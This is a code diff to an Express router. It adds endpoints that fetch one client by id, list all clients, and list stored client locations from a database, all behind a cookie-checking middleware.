@@ -4,7 +4,7 @@ const webCookieValidator = require('../../Utils/MiddleWears/webCookieValidator')
 const Utils = require('../../Utils/utilFunctions');
 const Command = require("../../Commands/commands.model");
 const Status = require("../../Status/status.model");
-
+const clientLocations = require("../../Location/clientLocation.model")
 
 router.use(webCookieValidator);
 
@@ -69,4 +69,53 @@ router.route('/kill').post((req,res )=>{
     }
 });
 
+//get specific client
+router.route('/client').post((req,res)=>{
+    const clientId = req.body.id;
+    Client.findOne({client_id:clientId},{}, {useFindAndModify:false}, function(err,user){
+        if(err){
+            Utils.LogToFile(`Error getting user by token ${err}`);
+            res.sendStatus(400);
+        }else{
+            if(user) {
+                res.send({user});
+            }else{
+                res.send({});
+            }
+        }
+    })
+})
+
+//get all clients
+router.route('/').get((req,res)=>{
+    Client.find({},{}, {}, function(err,users){
+        if(err){
+            Utils.LogToFile(`Error getting user by token ${err}`);
+            res.sendStatus(400);
+        }else{
+            if(users) {
+                res.send(users);
+            }else{
+                res.send();
+            }
+        }
+    })
+})
+
+
+//Get all client locations
+router.route('/locations').get((req,res)=> {
+    clientLocations.find({}, {}, {}, function (err, locations) {
+        if (err) {
+            Utils.LogToFile(`Error getting all client's locations ${err}`);
+            res.sendStatus(401);
+        } else {
+            if (locations) {
+                res.send(locations);
+            } else {
+                res.send();
+            }
+        }
+    })
+})
 module.exports = router;
